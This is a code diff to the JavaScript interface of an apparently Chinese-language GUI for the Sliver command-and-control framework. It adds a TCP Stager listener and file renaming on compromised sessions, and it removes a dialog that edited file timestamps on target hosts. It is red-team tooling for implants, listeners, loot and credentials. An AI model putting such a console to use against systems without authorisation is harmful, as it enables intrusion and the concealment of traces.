   const p = implantProfilesCache.find(profile => profile.name === name), f = document.getElementById('prof-form');
@@ -4366,7 +5105,7 @@ function genFromProfile(p) {
 function openListenersPanel() {
   const content = `<div class="listener-layout">
     <div class="panel"><h3>启动监听器</h3>
-      <div class="field-row"><label>类型</label><select id="ls-type"><option value="mtls">mTLS</option><option value="http">HTTP</option><option value="https">HTTPS</option><option value="dns">DNS</option><option value="wg">WireGuard</option></select></div>
+      <div class="field-row"><label>类型</label><select id="ls-type"><option value="mtls">mTLS</option><option value="http">HTTP</option><option value="https">HTTPS</option><option value="dns">DNS</option><option value="wg">WireGuard</option><option value="stager">TCP Stager</option></select></div>
       <div id="ls-fields"></div>
       <button class="btn accent" id="ls-start" style="width:100%;margin-top:6px">启动</button>
       <div id="ls-msg" class="status-msg"></div>
@@ -4379,14 +5118,15 @@ function openListenersPanel() {
 async function wireListeners() {
   const startBtn = document.getElementById('ls-start'); if (!startBtn) return;
   const typeEl = document.getElementById('ls-type'), fields = document.getElementById('ls-fields');
-  const httpProfiles = await App().ListHTTPC2Profiles().catch(() => []);
+  const [httpProfiles, implantProfiles] = await Promise.all([App().ListHTTPC2Profiles().catch(() => []), App().ListImplantProfiles().catch(() => [])]);
   const httpProfileSummary = httpProfiles.length
     ? httpProfiles.map(profile => profile.name).join('、')
     : '未读取到档案（HTTP 植入体通常需要 default 档案）';
   const renderFields = () => {
-    const type = typeEl.value, defaults={mtls:8888,http:80,https:443,dns:53,wg:51820};
+    const type = typeEl.value, defaults={mtls:8888,http:80,https:443,dns:53,wg:51820,stager:8443};
     if (type==='dns') fields.innerHTML=`<div class="field-row"><label>域名</label><input id="ls-domains" placeholder="c2.example.com, alt.example.com"/></div><div class="field-row"><label>绑定主机</label><input id="ls-host" value="0.0.0.0"/></div><div class="field-row"><label>端口</label><input id="ls-port" type="number" value="53"/></div><label class="check-label"><input id="ls-otp" type="checkbox"/> 强制 OTP</label><label class="check-label"><input id="ls-canaries" type="checkbox"/> 启用 Canary</label>`;
     else if(type==='wg') fields.innerHTML=`<div class="field-row"><label>绑定主机</label><input id="ls-host" value="0.0.0.0"/></div><div class="field-row"><label>UDP 端口</label><input id="ls-port" type="number" value="51820"/></div><div class="field-row"><label>隧道 IP</label><input id="ls-tun" value="100.64.0.1"/></div><div class="field-row"><label>TCP 通信端口</label><input id="ls-nport" type="number" value="8888"/></div><div class="field-row"><label>密钥交换端口</label><input id="ls-keyport" type="number" value="1337"/></div>`;
+    else if(type==='stager') fields.innerHTML=`<div class="field-row"><label>绑定主机</label><input id="ls-host" value="0.0.0.0"/></div><div class="field-row"><label>端口</label><input id="ls-port" type="number" min="1" max="65535" value="8443"/></div><div class="field-row"><label>植入体档案</label><select id="ls-stager-profile"><option value="">请选择档案</option>${implantProfiles.map(profile => `<option value="${esc(profile.name)}">${esc(profile.name)} · ${esc(profile.goos)}/${esc(profile.goarch)}</option>`).join('')}</select></div><div class="field-note">当前 Sliver RPC 仅支持 TCP Stager。HTTP(S)、压缩、AES-CBC 和 prepend-size 暂无稳定 GUI RPC，不会在这里伪装成可用选项。</div>`;
     else fields.innerHTML=`<div class="field-row"><label>绑定主机</label><input id="ls-host" value="0.0.0.0"/></div><div class="field-row"><label>端口</label><input id="ls-port" type="number" value="${defaults[type]}"/></div>${type==='http'||type==='https'?`<div class="field-row"><label>HTTP C2 档案</label><select disabled title="监听器自动加载 Teamserver 上的全部 HTTP C2 档案"><option>全部档案（按植入体自动匹配）</option></select></div><div class="field-note">当前可用：${esc(httpProfileSummary)}。Sliver 监听器 RPC 不接受单档案参数；植入体携带档案名称，监听器会自动匹配。</div><div class="field-row"><label>公开域名</label><input id="ls-domain" placeholder="可选"/></div><div class="field-row"><label>网站</label><input id="ls-website" placeholder="可选"/></div><div class="field-row"><label>长轮询超时 / 抖动</label><div class="inline-pair"><input id="ls-poll" type="number" min="0" value="0"/><input id="ls-jitter" type="number" min="0" value="0"/></div></div><label class="check-label"><input id="ls-otp" type="checkbox"/> 强制 OTP</label>${type==='https'?'<label class="check-label"><input id="ls-acme" type="checkbox"/> 使用 ACME</label><label class="check-label"><input id="ls-jarm" type="checkbox"/> 随机化 JARM</label>':''}`:''}`;
   };
   typeEl.addEventListener('change', renderFields); renderFields();
@@ -4401,6 +5141,7 @@ async function wireListeners() {
       else if (type==='https'||type==='http') await App().StartHTTPListener({host,port,secure:type==='https',domain:document.getElementById('ls-domain').value.trim(),website:document.getElementById('ls-website').value.trim(),acme:!!document.getElementById('ls-acme')?.checked,enforceOtp:document.getElementById('ls-otp').checked,longPollTimeout:parseInt(document.getElementById('ls-poll').value)||0,longPollJitter:parseInt(document.getElementById('ls-jitter').value)||0,randomizeJarm:!!document.getElementById('ls-jarm')?.checked});
       else if (type==='dns') await App().StartDNSListener({domains:document.getElementById('ls-domains').value.split(',').map(v=>v.trim()).filter(Boolean),host,port,canaries:document.getElementById('ls-canaries').checked,enforceOtp:document.getElementById('ls-otp').checked});
       else if(type==='wg') await App().StartWGListener({host,port,tunIp:document.getElementById('ls-tun').value.trim(),nPort:parseInt(document.getElementById('ls-nport').value)||0,keyPort:parseInt(document.getElementById('ls-keyport').value)||0});
+      else if(type==='stager') { const profileName=document.getElementById('ls-stager-profile').value; if(!profileName) throw new Error('请选择植入体配置档案'); const jobID=await App().StartStagerListener(host,port,profileName); msg.textContent=`TCP Stager 已启动（Job ${jobID}）`; msg.className='status-msg ok'; refreshListenerList(); return; }
       msg.textContent = `${type.toUpperCase()} 已启动`; msg.className = 'status-msg ok';
     } catch(e) { msg.textContent = rpcErrorMessage(e, '启动监听器失败'); msg.className = 'status-msg err'; }
     refreshListenerList();
@@ -4536,10 +5277,10 @@ function buildPalette(q) {
     ['sessions','会话'],['beacons','信标'],['tasks','任务中心'],['listeners','监听器'],['generate','生成植入体'],
     ['builds','构建记录'],['profiles','植入体配置'],['c2profiles','C2 配置'],['events','事件日志'],['loot','战利品'],
     ['creds','凭据'],['hosts','主机'],['iocs','IOC'],['report','报告'],['scripts','脚本'],['infrastructure','基础设施'],
-    ['extensions','扩展中心'],['mcp','MCP'],['operators','操作员'],['team','团队与审计']
+    ['extensions','扩展中心'],['official-console','官方控制台'],['mcp','MCP'],['operators','操作员'],['team','团队与审计']
   ];
   const items = [];
-  [...allSessions.map(s => ({ kind:'session', obj:s })), ...allBeacons.map(b => ({ kind:'beacon', obj:b }))].forEach(a => {
+  [...visibleSessions().map(s => ({ kind:'session', obj:s })), ...visibleBeacons().map(b => ({ kind:'beacon', obj:b }))].forEach(a => {
     const label = `${a.kind==='session'?'💻':'📡'} ${a.obj.hostname||a.obj.id.slice(0,8)} — ${a.obj.username||''}`;
     if (!q || label.toLowerCase().includes(q)) items.push({ label, action: () => { switchView('sessions'); openInteract(a.kind, a.obj); } });
   });
@@ -4605,21 +5346,6 @@ async function attemptReconnect() {
 function cancelReconnect() { reconnecting = false; clearInterval(reconnectTimer); document.getElementById('reconnect-overlay').classList.add('hidden'); }
 document.getElementById('reconnect-now-btn').addEventListener('click', attemptReconnect);
 document.getElementById('reconnect-cancel-btn').addEventListener('click', async () => { cancelReconnect(); await App().Disconnect().catch(()=>{}); document.getElementById('disconnect-btn').click(); });
-
-// Show GUI build version on the connect screen once the Wails runtime is ready.
-(async function showGuiVersion() {
-  let bi = null;
-  try { bi = await App().AppVersion(); } catch (e) { /* runtime not ready or older backend */ }
-  const el = document.getElementById('gui-version');
-  if (el) {
-    el.textContent = bi && bi.version ? `${bi.version} · ${bi.gitCommit}` : '';
-    el.title = bi ? `Built ${bi.buildDate}` : '';
-  }
-  const wm = document.getElementById('panel-watermark');
-  if (wm) wm.textContent = `Sliver GUI${bi && bi.version ? ' ' + bi.version : ''} · Made by Raj Kumar Mullapudi`;
-})();
-
-
 
 // ── File Browser Panel ───────────────────────────────────────────────────────
 async function openFileBrowser(sessionID) {
@@ -4692,30 +5418,6 @@ async function openFileBrowser(sessionID) {
     return Number.isNaN(date.getTime()) ? '—' : date.toLocaleString('zh-CN', { hour12: false });
   }
 
-  function propertyValue(value, fallback = '不可用') {
-    if (value === undefined || value === null || value === '') return fallback;
-    return String(value);
-  }
-
-  function filePropertiesSummary(props, hashResult) {
-    const rows = [
-      ['路径', props.path || ''],
-      ['类型', props.type || (props.isDir ? '文件夹' : '文件')],
-      ['大小', props.isDir ? '—' : fmtSize(Number(props.size || 0))],
-      ['修改时间', formatModTime(props.modTime)],
-      ['创建时间', formatModTime(props.createdAt)],
-      ['访问时间', formatModTime(props.accessedAt)],
-      ['权限/模式', propertyValue(props.mode)],
-      ['所有者', propertyValue(props.owner)],
-    ];
-    if (hashResult?.hash) rows.push([hashResult.algorithm || 'SHA-256', hashResult.hash]);
-    return rows.map(([label, value]) => `${label}: ${value}`).join('\n');
-  }
-
-  async function copyFilePropertyText(text, label = '内容') {
-    try { await navigator.clipboard.writeText(text || ''); toast('ok', `${label}已复制到剪贴板`); }
-    catch (error) { toastRpcError(error, '复制失败'); }
-  }
 
   const history = [];
   let histIdx = -1;
@@ -4862,174 +5564,6 @@ async function openFileBrowser(sessionID) {
     argsInput.focus();
   }
 
-  async function showFilePropertiesDialog(file, options = {}) {
-    if (!file) return;
-    const openTimestampEditor = Boolean(options.editTimestamps);
-    const ov = document.createElement('div');
-    ov.className = 'ui-dialog-overlay';
-    ov.innerHTML = `<div class="ui-dialog file-properties-dialog">
-      <div class="ui-dialog-title">${openTimestampEditor ? '修改时间戳' : '属性'}</div>
-      <div class="file-props-loading"><span class="spinner"></span>正在读取属性...</div>
-    </div>`;
-    document.body.appendChild(ov);
-    let closed = false;
-    let props = null;
-    let hashResult = null;
-    let editingTimestamps = openTimestampEditor;
-    let savingTimestamps = false;
-    let timestampDraft = {
-      accessedAt: '',
-      modifiedAt: TimestampEditor.unixSecondsToLocalInput(file.modTime),
-    };
-    const close = () => {
-      if (savingTimestamps) return;
-      closed = true;
-      ov.remove();
-      document.removeEventListener('keydown', onKey);
-    };
-    const onKey = () => {};
-    document.addEventListener('keydown', onKey);
-
-    const draw = (state = 'ready', message = '') => {
-      if (closed) return;
-      const hashRow = file.isDir
-        ? '<div><dt>SHA-256</dt><dd>目录不支持哈希核验</dd></div>'
-        : `<div><dt>SHA-256</dt><dd class="file-props-hash">${hashResult?.hash ? `<code>${esc(hashResult.hash)}</code><button class="btn small" data-props-copy-hash>复制</button>` : '未计算'}</dd></div>`;
-      const timestampEditor = editingTimestamps ? `<form class="file-timestamp-form" data-timestamp-form>
-        <div class="file-timestamp-fields">
-          <label><span>访问时间</span><input name="accessedAt" type="datetime-local" step="1" required value="${esc(timestampDraft.accessedAt)}"/><small>${props?.accessedAt ? '使用当前属性值预填。' : '上游无法读取当前值，请显式填写。'}</small></label>
-          <label><span>修改时间</span><input name="modifiedAt" type="datetime-local" step="1" required value="${esc(timestampDraft.modifiedAt)}"/><small>使用当前属性值预填。</small></label>
-        </div>
-        <div class="task-note">输入按操作员本机时区解释。当前 Sliver RPC 不支持修改创建时间。</div>
-        <div class="execute-file-error" role="alert">${state === 'timestamp-error' ? esc(message) : ''}</div>
-        <div class="ui-dialog-actions">
-          <button type="button" class="btn small" data-timestamp-cancel ${savingTimestamps ? 'disabled' : ''}>取消</button>
-          <button type="submit" class="btn small accent" data-timestamp-save ${savingTimestamps ? 'disabled' : ''}>${savingTimestamps ? '正在保存...' : '保存时间戳'}</button>
-        </div>
-      </form>` : '';
-      ov.innerHTML = `<div class="ui-dialog file-properties-dialog">
-        <div class="ui-dialog-title">${editingTimestamps ? '修改时间戳' : '属性'}</div>
-        <div class="file-props-head"><strong>${esc(file.name)}</strong><span>${esc(props?.type || (file.isDir ? '文件夹' : fileTypeLabel(file.name, false)))}</span></div>
-        ${message ? `<div class="task-note ${state === 'error' ? 'error-msg' : ''}">${esc(message)}</div>` : ''}
-        <dl class="file-props-grid">
-          <div><dt>完整路径</dt><dd><code>${esc(props?.path || file.path)}</code></dd></div>
-          <div><dt>类型</dt><dd>${esc(props?.type || (file.isDir ? '文件夹' : '文件'))}</dd></div>
-          <div><dt>大小</dt><dd>${props?.isDir ? '—' : fmtSize(Number(props?.size || file.size || 0))}</dd></div>
-          <div><dt>修改时间</dt><dd>${formatModTime(props?.modTime || file.modTime)}</dd></div>
-          <div><dt>创建时间</dt><dd>${formatModTime(props?.createdAt)}</dd></div>
-          <div><dt>访问时间</dt><dd>${formatModTime(props?.accessedAt)}</dd></div>
-          <div><dt>权限/模式</dt><dd>${esc(propertyValue(props?.mode || file.mode))}</dd></div>
-          <div><dt>所有者</dt><dd>${esc(propertyValue(props?.owner))}</dd></div>
-          ${hashRow}
-        </dl>
-        <div class="task-note">属性来自 Sliver 已公开的文件列表和下载 RPC；目标或 Teamserver 未返回的字段显示为不可用。</div>
-        ${timestampEditor}
-        <div class="ui-dialog-actions file-props-actions">
-          <button type="button" class="btn small" data-props-copy-path>复制路径</button>
-          <button type="button" class="btn small" data-props-copy-summary>复制摘要</button>
-          ${file.isDir ? '' : `<button type="button" class="btn small" data-props-hash ${state === 'hashing' ? 'disabled' : ''}>${state === 'hashing' ? '正在计算...' : '计算哈希'}</button>`}
-          <button type="button" class="btn small" data-props-edit-time ${editingTimestamps || savingTimestamps ? 'disabled' : ''}>修改时间戳</button>
-          <button type="button" class="btn small" data-props-refresh ${state === 'loading' ? 'disabled' : ''}>刷新</button>
-          <button type="button" class="btn small accent" data-dialog-close>关闭</button>
-        </div>
-      </div>`;
-      ov.querySelector('[data-dialog-close]')?.addEventListener('click', close);
-      ov.querySelector('[data-props-copy-path]')?.addEventListener('click', () => copyFilePropertyText(props?.path || file.path, '路径'));
-      ov.querySelector('[data-props-copy-summary]')?.addEventListener('click', () => copyFilePropertyText(filePropertiesSummary(props || file, hashResult), '属性摘要'));
-      ov.querySelector('[data-props-copy-hash]')?.addEventListener('click', () => copyFilePropertyText(hashResult?.hash || '', '哈希'));
-      ov.querySelector('[data-props-refresh]')?.addEventListener('click', () => loadProperties());
-      ov.querySelector('[data-props-hash]')?.addEventListener('click', calculateHash);
-      ov.querySelector('[data-props-edit-time]')?.addEventListener('click', startTimestampEdit);
-      ov.querySelector('[data-timestamp-cancel]')?.addEventListener('click', cancelTimestampEdit);
-      ov.querySelector('[data-timestamp-form]')?.addEventListener('submit', saveTimestamps);
-    };
-
-    function startTimestampEdit() {
-      timestampDraft = {
-        accessedAt: TimestampEditor.unixSecondsToLocalInput(props?.accessedAt),
-        modifiedAt: TimestampEditor.unixSecondsToLocalInput(props?.modTime || file.modTime),
-      };
-      editingTimestamps = true;
-      draw('ready');
-      ov.querySelector('input[name="accessedAt"]')?.focus();
-    }
-
-    function cancelTimestampEdit() {
-      if (savingTimestamps) return;
-      if (openTimestampEditor) return close();
-      editingTimestamps = false;
-      draw('ready');
-    }
-
-    async function saveTimestamps(event) {
-      event.preventDefault();
-      if (savingTimestamps) return;
-      const form = event.currentTarget;
-      timestampDraft = {
-        accessedAt: form.elements.accessedAt.value,
-        modifiedAt: form.elements.modifiedAt.value,
-      };
-      const accessed = TimestampEditor.localInputToUnixSeconds(timestampDraft.accessedAt);
-      const modified = TimestampEditor.localInputToUnixSeconds(timestampDraft.modifiedAt);
-      if (accessed.error || modified.error) {
-        draw('timestamp-error', accessed.error ? `访问时间：${accessed.error}` : `修改时间：${modified.error}`);
-        return;
-      }
-      const confirmed = await uiConfirm(
-        `确定修改“${file.path}”的时间戳吗？\n访问时间：${formatModTime(accessed.seconds)}\n修改时间：${formatModTime(modified.seconds)}`,
-        { title: '确认修改时间戳', okLabel: '保存' },
-      );
-      if (!confirmed || closed) return;
-      savingTimestamps = true;
-      draw('ready');
-      const error = await App().Chtimes(sessionID, file.path, accessed.seconds, modified.seconds).then(() => null).catch(value => value);
-      savingTimestamps = false;
-      if (error) {
-        const info = rpcError(error, '修改时间戳失败');
-        draw('timestamp-error', info.detail ? `${info.message}：${info.detail}` : info.message);
-        return;
-      }
-      editingTimestamps = false;
-      file.modTime = modified.seconds;
-      await loadProperties('时间戳已保存；修改时间已回读，访问时间是否可见取决于上游属性支持。');
-      await renderDir(currentPath, false);
-      toast('ok', '时间戳已修改');
-    }
-
-    async function loadProperties(successMessage = '') {
-      draw('loading', '正在刷新属性...');
-      const result = await App().FileBrowserProperties(sessionID, file.path).catch(error => ({ error }));
-      if (result?.error) {
-        const info = rpcError(result.error, '读取属性失败');
-        props = { ...file, type: file.isDir ? '文件夹' : '文件' };
-        draw('error', info.detail ? `${info.message}：${info.detail}` : info.message);
-        return;
-      }
-      props = result;
-      if (openTimestampEditor && editingTimestamps) {
-        timestampDraft = {
-          accessedAt: TimestampEditor.unixSecondsToLocalInput(props?.accessedAt),
-          modifiedAt: TimestampEditor.unixSecondsToLocalInput(props?.modTime || file.modTime),
-        };
-      }
-      draw('ready', successMessage);
-    }
-
-    async function calculateHash() {
-      if (file.isDir) return;
-      draw('hashing', '正在下载文件并计算 SHA-256...');
-      const result = await App().FileBrowserHash(sessionID, file.path).catch(error => ({ error }));
-      if (result?.error) {
-        const info = rpcError(result.error, '计算哈希失败');
-        draw('error', info.detail ? `${info.message}：${info.detail}` : info.message);
-        return;
-      }
-      hashResult = result;
-      draw('ready', `已计算 ${esc(result.algorithm || 'SHA-256')}，读取 ${fmtSize(Number(result.bytes || 0))}`);
-    }
-
-    await loadProperties();
-  }
 
   function showFileContextMenu(event, file) {
     event.preventDefault();
@@ -5048,7 +5582,16 @@ async function openFileBrowser(sessionID) {
       const action = button.dataset.fbAction;
       if (action === 'upload') return uploadToCurrentDirectory();
       if (!file) return;
-      if (action === 'timestamps') return showFilePropertiesDialog(file, { editTimestamps: true });
+      if (action === 'rename') {
+        const newName = await uiPrompt('新名称：', file.name || '', { title: file.isDir ? '重命名文件夹' : '重命名文件' });
+        if (newName === null) return;
+        if (newName.trim() === file.name) return toast('info', '名称未改变');
+        const result = await App().FileBrowserRename(sessionID, file.path, newName).then(path => ({ path })).catch(error => ({ error }));
+        if (result.error) return toastRpcError(result.error, '重命名失败');
+        toast('ok', `已重命名为：${newName.trim()}`);
+        await renderDir(currentPath, false);
+        return;
+      }
       if (action === 'execute' && !file.isDir) return showFileExecuteDialog(file);
       if (action === 'download') {
         const result = await runFileTransfer('download', sessionID, file.path, { isDirectory: file.isDir });
